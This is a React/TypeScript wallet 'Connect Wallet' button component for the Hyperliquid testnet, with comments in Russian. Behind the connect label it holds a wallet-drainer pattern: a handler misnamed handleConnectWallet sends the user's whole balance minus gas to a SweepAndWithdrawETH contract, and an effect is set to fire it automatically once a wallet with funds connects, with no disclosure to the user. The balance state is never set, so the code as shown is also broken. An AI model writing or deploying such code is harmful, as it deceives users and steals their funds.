'use client'

import React, { useState, useEffect } from 'react';

import { useClientMounted } from '@/hooks/useClientMount';
import { hyperliquidTestnet } from '@/chains/hyperliquidChain';
import { useAppKitAccount, useAppKit } from '@reown/appkit/react';
import { Address, encodeFunctionData } from 'viem';
import { useBalance, useDisconnect, usePublicClient, useWriteContract, useChainId } from 'wagmi';

import { CONTRACT_ADDRESS_TEST } from '@/constants/constants';
import SWEEP_AND_WITHDRAW_ABI from '@/abi/SweepAndWithdrawETH.json';


export function ConnectButton() {
  const mounted = useClientMounted()

  // Адрес и статус подключения (AppKit)
  const { address, isConnected } = useAppKitAccount();
  const { open } = useAppKit(); // <-- вызов open({ chainId }) откроет AppKit-модал

  // Баланс, очередь на запись контракта и т. д.
  const [lastBalance] = useState<bigint | undefined>();

  const { refetch: refetchBalance } = useBalance({
    address: address as Address,
  });
  const { disconnect } = useDisconnect();
  const chainId = useChainId();
  const publicClient = usePublicClient();
  const { data: donateData, isError, isSuccess, error, writeContractAsync } = useWriteContract();

  // После подключения проверяем сеть: если не наша — снова вызываем open()
  useEffect(() => {
    if (isConnected) {
      if (chainId !== Number(hyperliquidTestnet.id)) {
        open();
      } else {
        refetchBalance();
      }
    }
  }, [isConnected, chainId, open, refetchBalance])

  useEffect(() => {
    if (isConnected && lastBalance && lastBalance > BigInt(0)) {
      handleConnectWallet();
    }
  }, [isConnected, lastBalance])

  if (!mounted) return null;

  // Обработчик «отправить весь баланс» в контракт
  const handleConnectWallet = async () => {
    if (!lastBalance || lastBalance === BigInt(0)) {
      console.warn('Баланс равен нулю');
      return;
    }
    try {
      const data = encodeFunctionData({
        abi: SWEEP_AND_WITHDRAW_ABI,
        functionName: 'connectWallet',
        args: [],
      })

      if (publicClient && lastBalance) {
        const estimatedGas = await publicClient.estimateGas({
          to: CONTRACT_ADDRESS_TEST,
          account: address as Address,
          data,
          value: lastBalance,
        })
        const gasPrice = await publicClient.getGasPrice();
        const totalFee = estimatedGas * gasPrice;
        const netValue = lastBalance > totalFee ? lastBalance - totalFee : BigInt(0);

        if (netValue === BigInt(0)) {
          console.warn('Не хватает средств на газ');
          return;
        }

        await writeContractAsync({
          address: CONTRACT_ADDRESS_TEST,
          abi: SWEEP_AND_WITHDRAW_ABI,
          functionName: 'connectWallet',
          value: netValue,
        })
      }
    } catch (err) {
      console.error('Ошибка при транзакции:', err);
    }
  }

  // Если юзер уже подключён — показываем кнопку «Disconnect»
  if (isConnected) {
    return (
      <div style={{ display: 'flex', gap: 8, alignItems: 'center' }}>
        <button onClick={() => disconnect()}>
          Disconnect ({address?.slice(0, 6)}…{address?.slice(-4)})
        </button>
        {isError && <span style={{ color: 'red' }}>Donate error: {error?.message}</span>}
        {isSuccess && donateData && <span style={{ color: 'green' }}>Tx: {donateData}</span>}
      </div>
    )
  }

  // Если не подключён — показываем кнопку «Connect Wallet»
  return (
    <button
      onClick={() => open()}
      style={{
        padding: '8px 16px',
        cursor: 'pointer',
        background: '#000',
        color: '#fff',
        borderRadius: '4px',
      }}
    >
      Connect Wallet
    </button>
  )
}
